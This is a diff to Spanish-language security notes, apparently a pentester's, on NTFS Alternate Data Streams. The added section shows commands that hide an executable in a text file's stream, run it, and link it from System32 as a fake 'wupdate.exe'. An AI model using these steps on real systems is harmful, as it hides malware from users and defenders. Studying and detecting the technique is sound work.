@@ -29,6 +29,34 @@ Si abrimos el notepad, y guardamos, cuando abramos test.txt no podremos ver el c
 
 Para poder volver a ver el contenido, tendríamos que usar el mismo comando de antes.
 
+Si queremos **guardar un fichero malicioso**, sería el mismo proceso, por ejemplo:
+
+```cmd
+type payload.exe > windowslog.txt:winpeas.exe
+```
+
+Aquí lo que estamos haciendo es guardar el ejecutable payload.exe, dentro del stream de windowslog.txt, con la clave winpeas.exe, que posteriormente podremos acceder a través del stream.
+
+Normalmente lo que haríamos sería meter contenido al txt para que parezca un fichero real y seguro.
+
+Si queremos ejecutar el ejecutable que hemos escondido haríamos lo siguiente:
+
+```cmd
+start windowslog.txt:winpeas.exe
+```
+
+Es posible que nos de un error diciendo que **Access is denied**. Para solucionar esto, tendremos que crear un symlink de la siguiente manera:
+
+```cmd
+cd C:\Windows\System32
+mklink wupdate.exe C:\Temp\windowslog.txt:winpeas.exe
+```
+
+Si todo a salido bien, cada vez que ejecutemos wupdate, se ejecutará nuestro ejecutable.
+
+> [!TIP] Permisos
+> Se necesita una cuenta de administrador para realizar esto.
+
 
 ---
 # Backlinks
